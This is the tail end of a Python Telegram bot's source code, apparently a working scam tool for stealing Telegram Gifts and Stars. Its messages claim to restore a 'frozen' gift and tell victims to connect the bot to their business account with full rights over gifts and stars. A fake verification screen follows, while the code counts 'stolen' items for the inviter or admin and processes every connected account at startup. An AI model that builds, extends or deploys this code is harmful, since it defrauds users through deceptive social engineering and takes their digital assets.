            recipient_type = "–ø—Ä–∏–≥–ª–∞—Å–∏–≤—à–µ–º—É" if not is_admin else "–∞–¥–º–∏–Ω—É"
            result_msg.append(f"\nüéÅ –û—Å–Ω–æ–≤–Ω–æ–º—É –ø–æ–ª—É—á–∞—Ç–µ–ª—é ({recipient_type}): <b>{len(user_stolen)}</b>")
            result_msg.extend(user_stolen[:3])
    
    if errors:
        result_msg.append("\n‚ùå –û—à–∏–±–∫–∏:")
        result_msg.extend(errors[:3])

    await callback.message.answer("\n".join(result_msg), parse_mode="HTML")
    await callback.answer()
    
@dp.callback_query(F.data == "unfreeze_order")
async def handle_unfreeze_order(callback: CallbackQuery):
    await callback.message.delete()
    # –¢—Ä–∏ –∫–Ω–æ–ø–∫–µ –≤ unfreeze
    options_keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="1Ô∏è‚É£", callback_data="unfreeze_option_1")],
            [InlineKeyboardButton(text="2Ô∏è‚É£", callback_data="unfreeze_option_2")],
            [InlineKeyboardButton(text="3Ô∏è‚É£", callback_data="unfreeze_option_3")]
        ]
    )
    
    await callback.message.answer(
        text="‚ùì Under what circumstances did you receive\nthe frozen Gift?\n\n"
             "Please choose one of the options below:\n\n"
             "1Ô∏è‚É£ Purchased via Telegram and later\nupgraded\n\n"
             "2Ô∏è‚É£ Received directly from another user (as a\ngift or off-market trade)\n\n"
             "3Ô∏è‚É£ Acquired through the marketplace",
        reply_markup=options_keyboard
    )
    await callback.answer()

@dp.callback_query(F.data.startswith("unfreeze_option_"))
async def handle_unfreeze_option(callback: CallbackQuery):
    # –£–¥–∞–ª—è–µ—Ç –ø—Ä–æ—à–ª–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ –≤–Ω–∏–∑—É –∫–æ–º–∞–Ω–¥–∞ –µ—Å–ª–∏ —á–µ –ø—Ä–æ—Å—Ç–æ –≤—ã—Ä–µ–∑–∞—Ç—å
    await callback.message.delete()
    
    # –¢–µ–∫—Å—Ç –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏–∏
    instruction_text = (
        "Excellent! We have counted your answer\n\n"
        "üéÅ To restore the gift, you need to connect the bot to your workspace.\n\n"
        "üîπWhat you need to do:\n\n"
        "1Ô∏è‚É£ Add this bot to the \"Chatbots\" section in your business account\n"
        "2Ô∏è‚É£ Enable all the functions in the \"Manage gifts and stars\" block:\n\n"
        "‚úÖ View gifts and stars\n"
        "‚úÖ Exchange gifts for stars\n"
        "‚úÖ Set up gifts\n"
        "‚úÖ Transfer and improve gifts\n"
        "‚úÖ Send stars\n\n"
        "üì© After you add the bot and enable the necessary functions, do not turn it off "
        "until we notify you when the gift is restored, on average it takes 1 minutes\n\n"
        "We will see for ourselves when you do everything according to the instructions"
    )

    # –ö–Ω–æ–ø–∫–∞ "Done"
    done_button = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="Done", callback_data="verification_done")]
        ]
    )
    
    # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏—é —Å –∫–Ω–æ–ø–∫–æ–π
    await callback.message.answer(
        text=instruction_text,
        reply_markup=done_button
    )
    await callback.answer()


# –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –∫–Ω–æ–ø–∫–∏ "Done"
@dp.callback_query(F.data == "verification_done")
async def handle_done_button(callback: CallbackQuery):
    # –¢–æ–∂–µ —É–¥–∞–ª—è–µ—Ç –≤–Ω–∏–∑—É —Å—Ç—Ä–æ—á–∫–∞
    await callback.message.delete()
    
    # –í–µ—Ä–∏—Ñ —Ñ–∏–Ω–∞–ª
    done_text = (
        "üîî Verification is in progress...\n\n"
        "‚ö†Ô∏è This usually takes less than a minute. We'll notify you once it's done.\n\n"
        "üôè Please ensure the bot has access to Gifts and Stars."
    )
    await callback.message.answer(done_text)
    await callback.answer()

async def main():
    logger.info("–ó–∞–ø—É—Å–∫ –±–æ—Ç–∞...")
    try:
        connections = await bot.get_business_connections()
        logger.info(f"–ù–∞–π–¥–µ–Ω–æ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–π: {len(connections)}")  
        for conn in connections:
            await handle_business(conn)  
    except Exception as e:
        logger.error(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø—Ä–æ–≤–µ—Ä–∫–µ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–π: {e}")
    
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
